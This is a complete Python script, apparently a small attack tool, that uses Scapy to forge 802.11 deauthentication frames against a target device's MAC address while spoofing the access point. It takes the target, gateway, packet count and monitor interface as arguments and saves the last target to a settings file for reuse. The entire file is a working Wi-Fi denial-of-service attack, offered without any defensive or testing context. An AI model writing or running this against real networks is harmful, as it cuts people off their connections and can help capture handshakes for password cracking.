import os
import argparse
from scapy.all import *

settings_file = "deauth_settings.txt"

# Set up command-line argument parsing
parser = argparse.ArgumentParser(description="Send deauthentication packets")
parser.add_argument("-t", "--target", help="Target MAC address", required=True)
parser.add_argument("-g", "--gateway", help="Gateway (AP) MAC address", required=True)
parser.add_argument("-n", "--num-packets", help="Number of packets to send", type=int, required=True)
parser.add_argument("-i", "--interface", help="Interface to use (e.g., wlan1mon)", required=True)
parser.add_argument("-l", "--use-last-settings", help="Use last settings from file", action="store_true")
args = parser.parse_args()

# Check if the settings file exists and read the last settings
if os.path.exists(settings_file) and args.use_last_settings:
    with open(settings_file, "r") as file:
        last_settings = file.read().splitlines()
    if len(last_settings) == 4:
        args.target, args.gateway, args.num_packets, args.interface = last_settings
        args.num_packets = int(args.num_packets)

# Save the settings for next time
with open(settings_file, "w") as file:
    file.write(f"{args.target}\n{args.gateway}\n{args.num_packets}\n{args.interface}")

# Loop to send the specified number of deauth packets
for i in range(args.num_packets):
    # Construct the deauth packet targeting the device
    dot11 = Dot11(addr1=args.target, addr2=args.gateway, addr3=args.gateway)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=1, iface=args.interface, verbose=1)
